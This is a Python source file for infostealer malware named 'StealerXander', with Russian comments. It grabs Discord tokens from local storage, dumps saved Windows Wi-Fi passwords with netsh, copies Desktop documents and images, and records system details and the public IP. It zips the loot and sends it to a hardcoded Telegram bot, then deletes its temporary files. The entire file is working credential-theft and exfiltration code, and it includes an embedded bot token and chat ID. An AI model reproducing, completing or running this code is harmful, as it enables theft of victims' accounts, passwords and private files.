import os
import json
import requests
import platform
import getpass
import shutil
import base64
import tempfile
import subprocess
import re
from datetime import datetime

# ===== ТВОИ ДАННЫЕ =====
BOT_TOKEN = "8533094049:AAH5x8O0SLV2qNDsfiK3hE2QeGsVKpfLies"
CHAT_ID = "5671755030"

# ===== ОТПРАВКА =====
def send_to_telegram(file_path, caption=""):
    """Отправляет файл в Telegram"""
    try:
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': CHAT_ID, 'caption': caption[:200]}
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                files=files,
                data=data,
                timeout=30
            )
        return True
    except:
        return False

def send_message(text):
    """Отправляет текст"""
    try:
        data = {'chat_id': CHAT_ID, 'text': text[:4096]}
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data=data,
            timeout=30
        )
    except:
        pass

def get_system_info():
    """Собирает информацию о системе"""
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Не удалось определить"
    
    info = f"""
🔥 **StealerXander - Отчет**

🖥 **Компьютер:** {platform.node()}
💻 **Система:** {platform.system()} {platform.release()}
📡 **Архитектура:** {platform.machine()}
👤 **Пользователь:** {getpass.getuser()}
📅 **Дата:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌍 **IP:** {ip}
    """
    return info

# ===== 1. ТОКЕНЫ DISCORD =====
def steal_discord_tokens():
    """Собирает Discord токены"""
    tokens = []
    
    # Пути для Android и Windows
    discord_paths = [
        os.path.expanduser('~') + '/AppData/Roaming/discord/Local Storage/leveldb/',
        os.path.expanduser('~') + '/AppData/Roaming/discordptb/Local Storage/leveldb/',
        os.path.expanduser('~') + '/AppData/Roaming/discordcanary/Local Storage/leveldb/',
        '/data/data/com.discord/',  # Android путь
    ]
    
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
    
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for file_name in os.listdir(path):
                    if file_name.endswith(('.log', '.ldb', '.db')):
                        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
            except:
                continue
    
    return list(set(tokens))

# ===== 2. ФАЙЛЫ С РАБОЧЕГО СТОЛА =====
def steal_desktop_files():
    """Копирует файлы с рабочего стола"""
    desktop = os.path.expanduser('~') + '/Desktop/'
    files = []
    
    if os.path.exists(desktop):
        temp_dir = tempfile.mkdtemp()
        for file in os.listdir(desktop)[:50]:  # первые 50 файлов
            if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png')):
                try:
                    src = os.path.join(desktop, file)
                    dst = os.path.join(temp_dir, file)
                    shutil.copy2(src, dst)
                    files.append(dst)
                except:
                    continue
        
        if files:
            zip_path = os.path.join(temp_dir, 'desktop_files.zip')
            shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
            return zip_path
    
    return None

# ===== 3. Wi-Fi ПАРОЛИ (для Windows) =====
def steal_wifi_passwords():
    """Пытается получить Wi-Fi пароли (только Windows)"""
    wifi_data = []
    
    if platform.system() == 'Windows':
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866', errors='ignore').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i or "All User Profile" in i]
            
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('cp866', errors='ignore').split('\n')
                    password_lines = [i.split(":")[1][1:-1] for i in results if "Содержимое ключа" in i or "Key Content" in i]
                    password = password_lines[0] if password_lines else None
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    continue
        except:
            pass
    
    return wifi_data

# ===== ГЛАВНАЯ =====
def main():
    try:
        send_message("🚀 Stealer запущен!")
        
        temp_dir = tempfile.mkdtemp()
        
        # Системная информация
        with open(os.path.join(temp_dir, 'system.txt'), 'w', encoding='utf-8') as f:
            f.write(get_system_info())
        
        # Discord токены
        discord_tokens = steal_discord_tokens()
        if discord_tokens:
            with open(os.path.join(temp_dir, 'discord_tokens.txt'), 'w') as f:
                for t in discord_tokens:
                    f.write(t + '\n')
        
        # Wi-Fi пароли
        wifi = steal_wifi_passwords()
        if wifi:
            with open(os.path.join(temp_dir, 'wifi.json'), 'w') as f:
                json.dump(wifi, f, indent=2)
        
        # Файлы с рабочего стола
        desktop_zip = steal_desktop_files()
        if desktop_zip and os.path.exists(desktop_zip):
            shutil.copy(desktop_zip, os.path.join(temp_dir, 'desktop.zip'))
        
        # Создаем архив
        zip_path = os.path.join(tempfile.gettempdir(), 'stealer_data.zip')
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
        
        # Отправляем
        send_to_telegram(zip_path, f"📦 Данные с {platform.node()}")
        
        # Чистим
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if desktop_zip and os.path.exists(desktop_zip):
            os.remove(desktop_zip)
        
        send_message("✅ Готово!")
        
    except Exception as e:
        send_message(f"❌ Ошибка: {str(e)}")

if __name__ == "__main__":
    main()